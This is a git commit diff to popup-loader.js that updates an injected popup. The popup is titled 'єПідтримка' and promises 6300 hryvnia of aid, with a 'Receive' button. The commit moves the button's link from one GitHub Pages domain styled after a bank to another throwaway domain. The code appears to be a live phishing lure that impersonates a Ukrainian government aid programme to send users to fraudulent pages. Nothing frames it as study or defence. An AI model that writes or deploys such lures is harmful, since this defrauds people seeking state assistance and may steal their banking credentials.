5389bc54794f8046c19bdae6aa911a91ee35baa7
FoxySend <schultzfchasidy252@gmail.com>
2024-12-16 10:35:21 +0100

    Update popup-loader.js

--- popup-loader.js
+++ popup-loader.js
@@ -28,14 +28,14 @@ document.addEventListener("DOMContentLoaded", function() {
 
         let title = document.createElement('div');
         title.style.textAlign = 'center';
-        title.innerHTML = "<p>\"єПідтримка\"</p><p>Допомога у 6500 гривень</p>";
+        title.innerHTML = "<p>\"єПідтримка\"</p><p>Допомога у 6300 гривень</p>";
         title.style.marginBottom = '20px';
         title.style.fontSize = '18px';
         title.style.fontWeight = 'bold';
         title.style.color = '#333';
 
         let button = document.createElement('a');
-        button.href = 'https://privat-next.github.io/2024/';
+        button.href = 'https://ua-j24.github.io/2024/';
         button.innerText = 'Отримати';
         button.style.padding = '15px 25px';
         button.style.backgroundColor = '#28a745';
